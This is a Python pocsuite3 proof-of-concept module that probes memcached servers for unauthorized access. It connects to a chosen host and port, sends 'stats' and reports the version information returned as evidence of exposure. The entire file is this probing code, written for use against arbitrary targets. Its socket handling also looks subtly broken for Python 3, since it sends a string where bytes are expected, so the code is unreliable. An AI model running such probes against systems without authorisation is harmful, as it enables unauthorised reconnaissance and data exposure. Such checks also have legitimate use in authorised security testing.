# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
import socket

class MemcacheUnauthPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 2, 2020'
    createDate = 'Aug 2, 2020'
    name = 'memcache未授权访问'
    appName = 'memcache'
    appVersion = 'v1.0.0'
    vulType = '未授权访问'
    protocol = 'memcache'
    desc = '''
    memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。
    如果memcached对外开放访问，攻击者可通过该漏洞泄露服务器的敏感信息。
    '''

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 11211
        result = {}
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host,int(port)))
            s.send("stats\r\n")
            info = s.recv(4096)
            if "STAT version" in info:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = '{}:{}'.format(host,port)
                result['extra'] = {}
                result['extra']['evidence'] = info.strip()
        except Exception as e:
            logger.info('{}:{} fail:{}'.format(host,port,str(e)))
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

register_poc(MemcacheUnauthPOC)